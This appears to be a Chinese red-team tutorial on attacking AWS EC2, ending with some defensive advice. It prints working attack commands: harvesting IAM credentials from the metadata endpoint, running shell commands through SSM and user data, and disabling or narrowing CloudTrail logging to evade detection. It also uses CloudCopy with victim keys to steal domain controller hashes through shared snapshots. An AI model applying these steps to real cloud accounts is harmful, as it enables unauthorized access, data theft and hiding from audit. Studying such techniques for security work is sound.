---
title: AWS EC2 弹性计算服务攻防
id: aws_ec2
---

## 0x00 前言

在平时进行红蓝攻防演练的时候，经常会碰到目标资产在云服务机器上的情况，新的技术也会带来新的风险，本文将以 AWS 的 EC2（Elastic Compute Cloud）弹性计算服务为例，主要谈谈在面对云服务器场景下的一些攻防手法。

<!-- more -->

## 0x01 初始访问

### 1、元数据

元数据服务是一种提供查询运行中的实例内元数据的服务，当实例向元数据服务发起请求时，该请求不会通过网络传输，如果获得了目标 EC2 权限或者目标 EC2 存在 SSRF 漏洞，就可以获得到实例的元数据。



通过元数据，攻击者除了可以获得 EC2 上的一些属性信息之外，有时还可以获得与该实例绑定角色的临时凭证，并通过该临时凭证获得云服务器的控制台权限，进而横向到其他机器。


通过访问元数据的`/iam/security-credentials/<rolename>`路径可以获得目标的临时凭证，进而接管目标服务器控制台账号权限，前提是目标需要配置 IAM 角色才行，不然访问会 404

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648542914-612135-image.png)

通过元数据获得目标的临时凭证后，就可以接管目标账号权限了。

### 2、凭证泄露

云场景下的凭证泄露可以分成以下几种：

- 控制台账号密码泄露，例如登录控制台的账号密码
- 临时凭证泄露
- 访问密钥泄露，即 AccessKeyId、SecretAccessKey 泄露
- 实例登录凭证泄露，例如 AWS 在创建 EC2 生成的证书文件遭到泄露


对于这类凭证信息的收集，一般可以通过以下几种方法进行收集：

- Github 敏感信息搜索
- 反编译目标 APK、小程序
- 目标网站源代码泄露

### 3、账号劫持

如果云厂商的控制台存在漏洞的话，用户账号也会存在一定的风险。

例如 AWS 的控制台曾经出现过一些 XSS 漏洞，攻击者就可能会使用这些 XSS 漏洞进行账号劫持，从而获得目标云服务器实例的权限。

### 4、恶意的镜像

AWS 在创建实例的时候，用户可以选择使用公共镜像或者自定义镜像，如果这些镜像中有恶意的镜像，那么目标使用该镜像创建实例就会产生风险。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648542976-777389-image.png)

以 CVE-2018-15869 为例，关于该漏洞的解释是：当人们通过 AWS 命令行使用「ec2 describe-images」功能时如果没有指定 --owners 参数，可能会在无意中加载恶意的 Amazon 系统镜像 ( AMI），导致 EC2 被用来挖矿。


对此，在使用 AWS 命令行时应该确保自己使用的是不是最新版的 AWS 命令行，同时确保从可信的来源去获取 Amazon 系统镜像。

### 5、其他的初始访问方法

除了以上云场景下的方法外，还可以通过云服务上的应用程序漏洞、SSH 与 RDP 的弱密码等传统场景下的方法进入目标实例。


## 0x02 命令执行

### 1、接管控制台

拿到 AWS 凭证后，可以进行控制台的接管，这里以 pacu 工具为例。

pacu 工具里包含了很多 AWS 利用模块，首先使用 set_keys 命令将刚才获取到的 key 值添加到工具里。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543015-119620-image.png)

接下来输入 console 命令，得到一个 URL。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543030-749370-image.png)

将该 URL 粘贴到浏览器，就可以访问到目标的控制台了，这时就可以做很多操作了，比如连接到实例上执行命令。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543042-712522-image.png)

当目标实例被 AWS Systems Manager 代理后，除了在控制台中直接连接到实例外，在 AWS Systems Manager 下也可以执行命令。


来到控制台的 AWS Systems Manager -> 运行命令界面下，命令文档选择 AWS-RunShellScript，命令参数设置为自己想执行的命令

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543063-222756-image.png)


手动选择想要执行命令的实例，输出选项可以不设置，然后点击运行

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543094-133310-image.png)

点击实例 ID 就能看到命令运行的结果了

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543102-708394-image.png)

### 2、aws cli

当目标实例被 AWS Systems Manager 代理后，除了在控制台可以执行命令外，拿到凭证后使用 AWS 命令行也可以在 EC2 上执行命令。

列出目标实例 ID

```bash
aws ec2 describe-instances --filters "Name=instance-type,Values=t2.micro" --query "Reservations[].Instances[].InstanceId"
```

在对应的实例上执行命令，注意将 instance-ID 改成自己实例的 ID

```bash
aws ssm send-command \
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --parameters commands=ifconfig \
    --output text
```

获得执行命令的结果，注意将 $sh-command-id 改成自己的 Command ID

```bash
aws ssm list-command-invocations \
    --command-id $sh-command-id \
    --details
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543180-251432-image.png)

### 3、用户数据

在创建云服务器时，用户可以通过指定自定义数据，进行配置实例，当云服务器启动时，自定义数据将以文本的方式传递到云服务器中，并执行该文本，而且文本里的命令默认以 root 权限执行。

通过这一功能，攻击者可以修改实例的用户数据并向其中写入待执行的命令，这些代码将会在实例每次启动时自动执行。

##### 控制台

在控制台界面可以直接编辑实例的用户数据。

> 在 AWS 下，修改用户数据需要停止实例，在 AWS 下停止实例会擦除实例存储卷上的所有数据，如果没设置弹性 IP，实例的公有 IP 也会变化，因此停止实例需谨慎。

修改用户数据的位置在：操作-> 实例设置->编辑用户数据

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543226-918481-image.png)

这里以执行 touch 命令为例

如果用户数据设置为以下内容，那么实例只有才第一次启动才会运行

```bash
#!/bin/bash
touch /tmp/teamssix.txt
```

如果用户数据设置为以下内容，那么实例只要重启就会运行

```bash
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
touch /tmp/teamssix.txt
--//--
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543257-290546-image.png)

保存用户数据后启动实例，这时进入实例，就可以看到刚才创建的文件了，这说明刚才的命令已经被执行了

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543268-593296-image.png)

##### 命令行

除了在控制台上操作的方式外，也可以使用 aws cli 操作

```bash
aws ec2 run-instances --image-id ami-abcd1234 --count 1 --instance-type m3.medium \
--key-name my-key-pair --subnet-id subnet-abcd1234 --security-group-ids sg-abcd1234 \
--user-data file://my_script.txt
```

my_script.txt 就是要执行的脚本

查看实例用户数据

```bash
aws ec2 describe-instance-attribute --instance-id i-1234567890abcdef0 --attribute userData --output text --query "UserData.Value" | base64 --decode
```

### 4、其他的命令执行方法

除了上述云场景下的命令执行方法外，还有通过 RCE 漏洞、SSH 登录到实例、后门文件等等传统方法进行命令执行。

## 0x03 权限维持

### 1、用户数据

在上文描述到用户数据的时候，可以很容易发现用户数据可以被用来做权限维持，只需要将要执行的命令改成反弹 Shell 的命令即可。

但是也许目标可能很长时间都不会重启实例，而且用户数据也只有实例停止时才能修改，因此还是传统的权限维持方式会更具有优势些，这样来看使用用户数据进行权限维持显得就有些鸡肋了。

### 2、后门镜像

当攻击者获取到控制台权限后，可以看看目标的 AMI（Amazon 系统镜像），如果可以对其进行修改或者删除、创建的话，RT 就可以将原来的镜像替换成存在后门的镜像。

这样当下次目标用户在选用该镜像创建实例的时候，就会触发我们在镜像中植入的恶意代码了。

### 3、创建访问密钥

如果当前环境可以创建新的访问密钥，则可以通过创建访问密钥的方式进行权限维持。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543303-295412-image.png)

### 4、创建辅助账号

除了以上的权限维持方法，还可以通过创建高权限子账号的方式进行权限维持，然后通过这个子账号进行后续的持续攻击行为。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543315-744363-image.png)


### 5、其他的权限维持方法

除了上述方法外，还可以通过在实例中添加隐藏用户、安装远控软件等等传统方法进行权限维持。

## 0x04 权限提升

云场景下的权限提升大多还是传统场景下的一些提升方法，例如通过实例的内核漏洞进行提权、通过实例上的服务漏洞进行提权等等。

## 0x05 防御绕过

### 1、关闭安全监控服务

云平台上往往会对实例提供一些安全监控产品，攻击者在开展攻击前，应该把这类安全监控产品关闭，以避免对方的追溯和发现。

在 AWS 下，可以通过控制面板或者命令行关闭跟踪

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543363-112577-image.png)


### 2、在监控区域外攻击

上面这种停止或者删除的操作会触发告警，因此可以通过配置禁用多区域日志记录功能，并在监控区域外进行攻击，这样就监控不到了。

```bash
aws cloudtrail update-trail --name [my-trail] --no-is-multi-region-trail --no-include-global-service-events
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543375-711761-image.png)


在 AWS 中可以通过以下命令查看 Cloudtrail 的监控范围，这样我们就可以通过攻击监控范围外的主机，以避免触发告警。

```bash
aws cloudtrail describe-trails
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543387-948591-image.png)


例如这里的主区域为 ap-northeast-2，而 IsMultiRegionTrail 多区域跟踪是关闭的，也就是说当前这个 Trail 只会记录 ap-northeast-2 区域内的事件。

### 3、停止日志记录

相较于上面两种方法，在攻击开始前关闭日志，攻击结束后再开启日志是更方便友好的办法。

列出跟踪

```bash
aws cloudtrail list-trails
```

关闭日志记录功能

```bash
aws cloudtrail stop-logging --name [my-trail]
```

开启日志记录功能

```bash
aws cloudtrail start-logging --name [my-trail]
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543409-747002-image.png)

#### 0x04 其他的防御绕过

除了上述在控制台、命令行操作外，一些传统的手法也需要使用到，例如挂代理、删除实例上的痕迹等等。

## 0x06 信息收集

### 1、共享快照

如果当前凭证具有 EC2:CreateSnapshot 权限的话，可以通过创建共享快照的方式，然后将自己 aws 控制台下的实例挂载由该快照生成的卷，从而获取到目标 EC2 中的内容。

##### 公有快照

这里以公有快照作为示例。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543425-606436-image.png)

这里随便找一个快照，点击创建卷，卷的大小需要大于或等于快照大小，这里创建一个 20G 大小的卷，另外可用区需要和自己的 EC2 保持一致，最后快照 ID 指定刚才随便找的快照

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543435-864954-image.png)

将刚创建的卷挂载到自己的实例中

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543447-32977-image.png)


登录到自己的实例，查看刚才添加卷的名称

```bash
sudo fdisk -l
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543459-881275-image.png)


通过大小可以判断出来 /dev/xvdf 是刚才刚才添加的卷，然后将这个卷挂载到实例中，通过 ls 就可以看到这个公有快照中的数据了。

```bash
sudo mkdir /test
sudo mount /dev/xvdf3 /test
sudo ls /test
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543468-977942-image.png)


##### 私有快照

在拿到目标 AWS 控制台权限时，如果无法登录到实例，可以为目标实例打个快照，然后将快照共享给自己。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543479-52550-image.png)


将自己的账号 ID 添加到快照共享后，在自己的 AWS 快照控制台的私有快照处就能看到目标快照了，此时就可以将其挂载到自己的实例，查看里面的数据了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543490-328204-image.png)

目前也已经有了自动化工具了，CloudCopy 可以通过提供的访问凭证自动实现创建实例快照、自动挂载快照等操作

不过 CloudCopy 默认只会获取实例中的域成员哈希值，也就是说前提目标实例是一个域控，不过将这个工具稍微加以修改，就可以获取到其他的文件了，下面来看下这个工具的使用。

获取 CloudCopy 工具

```bash
git clone https://github.com/Static-Flow/CloudCopy.git
cd CloudCopy
python3 CloudCopy.py
```
> 如果运行报错，一般是因为第三方库缺失，根据提示安装对应模块即可

接下来，开始进行相应的配置，输入自己的 AWS 账号 ID 及访问凭证以及目标的访问凭证

```bash
manual_cloudcopy
show_options
set attackeraccountid xxx
set attackerAccessKey xxx
set attackerSecretKey xxx
set victimAccessKey xxx
set victimSecretKey xxx
set region ap-northeast-2
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543533-498762-image.png)

配置好之后，就可以利用 CloudCopy 进行哈希窃取了

```bash
stealDCHashes
```

这时会提示选择实例，直接输入要窃取的实例编号即可

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543549-105567-image.png)

等待一段时间，就可以看到已经读到 DC 的哈希了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543558-824550-image.png)

### 2、元数据

在云场景下可以通过元数据进行临时凭证和其他信息的收集，在 AWS 下的元数据地址为：http://169.254.169.254/latest/meta-data/，直接 curl 请求该地址即可。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543572-864070-image.png)


这里介绍一些对于 RT 而言价值相对较高的元数据：

```text
mac    实例 MAC 地址
hostname    实例主机名
iam/info    获取角色名称
local-ipv4    实例本地 IP
public-ipv4    实例公网 IP
instance-id    实例 ID
public-hostname    接口的公有 DNS (IPv4)
placement/region    实例的 AWS 区域
public-keys/0/openssh-key    公有密钥
/iam/security-credentials/<rolename>    获取角色的临时凭证
```

### 3、云服务访问密钥

如果目标在实例上配置了 AWS 命令行工具，那么在 ~/.aws/credentials 路径下，可以看到所配置的访问密钥

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543612-82241-image.png)


### 4、用户数据

在获取到目标实例的权限后，在 /var/lib/cloud/instances/instance-id/ 目录下可以看到当前实例的用户数据

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543625-258427-image.png)

在 /var/log/cloud-init-output.log 中可以看到用户数据执行的日志

或者直接使用元数据服务获取用户数据内容，如果返回 404 说明没有用户数据

```bash
curl http://169.254.169.254/latest/user-data
```

### 5、网段信息

在进行横向移动时，如果知道目标存在哪些网段可以起到事半功倍的效果，在云场景下，可以直接通过控制台看到目标的网段情况。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543640-195830-image.png)

或者通过命令行获取目标子网信息

```bash
aws ec2 describe-subnets --query 'Subnets[].CidrBlock'
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543667-718686-image.png)

### 6、其他的信息收集

除了上述和云场景相关的信息收集之外，在实例上的传统信息收集也不能少，例如实例上可能会有一些配置文件的账号密码泄露、网络连接情况等等。

## 0x07 横向移动

### 1、控制台

当攻击者拿到目标 AWS 控制台权限后，就可以通过控制台上的实例连接功能进行内网横向移动。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543678-180100-image.png)

### 2、访问凭证

当拿到目标的临时访问凭证或者访问密钥后，可以通过命令行或者也可以通过控制台的方式进行内网横向移动。

### 3、其他方法

虽然在云上，但如果通过前期的信息收集发现目标都处于相同的网段中的话，那么传统的内网横向方法就也是可以使用的。

## 0x08 影响

### 1、子域名接管

存在这个漏洞的前提是目标的 AWS EC2 没有配置弹性 IP，此时如果目标子域 CNAME 配置了该公有 IPv4 DNS 地址或者 A 记录配置了公有 IPv4 IP 地址，那么当该 EC2 被关机或者销毁时，该实例的公有 IP 也会随之释放，此时这个 IP 就会被分配给新的 EC2 实例，造成子域名接管。

例如下面这个这个域名，可以看到 CNAME 绑定到了 AWS 的 EC2 上，可以看到现在 EC2 IP 地址是 15 开头的。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543696-915761-image.png)

访问下，可以看到是正常访问的

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543706-45833-image.png)

此时我们将这个 EC2 实例停止再开机，在控制台可以看到 IP 地址已经变成了 3 开头的了

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543720-612005-image.png)

此时，因为 CNAME 记录还是原来的记录，所以再次访问 ec2.teamssix.com 可以看到已经访问不到了，因为原来的那个 15 开头的 IP 此时已经不是我们的了，这样便造成了域名接管。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543750-286683-image.png)

只是这个域名不是被我们接管的，而是被别人接管了，或许自己的域名会被定向到别人的 Jenkins 上也说不定【手动狗头】

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543760-316850-image.png)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543767-108896-image.png)

> 白帽子：你资产里的有个 Jenkins RCE ！！！
>
> 厂家回复：感谢提交，我们正在调查。哦，这个域名的 DNS 记录看起来是个悬挂 DNS 记录，这个 Jenkins 资产不是我们的哦。

那么其实这里问题来了，怎么判断 DNS 记录里的 EC2 IP 是公有 IP 还是弹性 IP 呢？大概有以下几种方法：

1、证书判断，如果某个子域绑定了 AWS EC2 IP，但是这个网站证书和其他子域名的证书明显不一致，那么可能这个 EC2 就是使用的公有 IP，而且当前的 IP 已经是别人的 IP 了，当然前提是网站使用了 HTTPS

2、网络空间搜索引擎历史记录，通过对该 IP 的历史搜索记录进行查询，如果该 IP 的历史扫描记录一直在变化，那么可能就是公有 IP

3、通过谷歌、百度搜索的历史记录去判断，这个原理和上面的第 2 点一样，都是通过有没有变化去判断。

不过其实上面三种方法也没法百分百的确定，所以其实最好的办法就是直接问对方，当前 IP 是不是对方所属，虽然这种做法不太 Hacker，但确实是最有效的办法了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-03-29/1648543800-554517-image.png)

最后如果子域名要绑定 EC2，建议为 EC2 绑定个弹性 IP，这样即使实例重启，IP 也不会变，避免自己的域名绑到了其他人的 EC2 的尴尬场景。

> 不过 u1s1，这个问题影响不算太大，毕竟攻击者想劫持到这个域名的成本还是蛮高的。

### 2、其他影响

在得到目标的凭证后，就相当于获取了目标的资源权限，这时候也可以对目标资源进行一些传统场景下的利用，比如敏感信息窃取、篡改、加密勒索等等。

## 0x09 总结

除了以上云场景下独有的攻击方式外，一些非云场景下的攻击方式，例如服务器上的应用漏洞、邮件钓鱼获得凭证、通过计划任务进行权限维持等等，在 EC2 上也是会受到此类漏洞的影响的，不过这类非云场景的文章已经很多就不再赘述了。

整体而言，云场景下的攻击手法大多还是围绕着凭证泄露、配置错误这类问题展开，对于开发和运维人员而言，具备正确的配置、一定的安全意识就能避免很多安全问题的产生。


> 参考文章：
> https://attack.mitre.org/matrices/enterprise/cloud
> https://cloud.tencent.com/developer/article/1931560
> https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2
> https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/
> https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html
> https://aws.amazon.com/cn/premiumsupport/knowledge-center/execute-user-data-ec2/
> https://docs.aws.amazon.com/zh_cn/systems-manager/latest/userguide/walkthrough-cli.html
> https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html
> https://aws.amazon.com/cn/getting-started/hands-on/remotely-run-commands-ec2-instance-systems-manager/
